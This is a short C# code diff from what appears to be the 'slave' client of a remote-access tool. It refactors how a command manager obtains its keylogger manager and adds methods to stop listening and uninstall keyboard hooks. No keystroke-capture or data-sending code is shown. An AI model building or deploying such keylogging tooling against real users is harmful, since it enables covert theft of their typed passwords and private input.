@@ -8,19 +8,27 @@ namespace Slave.Commands.Core
 {
     public class SlaveCommandsManager : GlobalCommandsManager
     {
-        public SlaveCommandsManager(GlobalNetworkManager networkManager) : base(networkManager) { }
+        KeyLoggerManager keyLoggerManager { get; }
+
+
+        public SlaveCommandsManager(GlobalNetworkManager networkManager) : base(networkManager)
+        {
+            keyLoggerManager = ((KeyLoggerCommand) GetCommandByName("keylogger")).keyLoggerManager;
+        }
 
 
         /// <summary>
-        /// Find the keylogger ICommand in the commandList and give it the KeyLoggerManager instance
-        /// This method should only be called by the MainWindow
+        /// Stop the keylogger from listening to keypresses
         /// </summary>
-        /// <param name="manager">KeyLoggerManager instance</param>
-        public void PassKeyloggerManagerInstance(KeyLoggerManager manager)
-        {
-            var keyloggerCommandInstance = (KeyLoggerCommand)commandList.Find(x => x.name == "keylogger");
-            keyloggerCommandInstance.GetKeyLoggerManagerInstance(manager);
-        }
+        public void StopKeyloggerListening()
+            => keyLoggerManager.StopListening();
+
+
+        /// <summary>
+        /// Stop the keylogger, uninstall keyboard hooks
+        /// </summary>
+        public void StopKeylogger()
+            => keyLoggerManager.Stop();
 
 
         /// <summary>
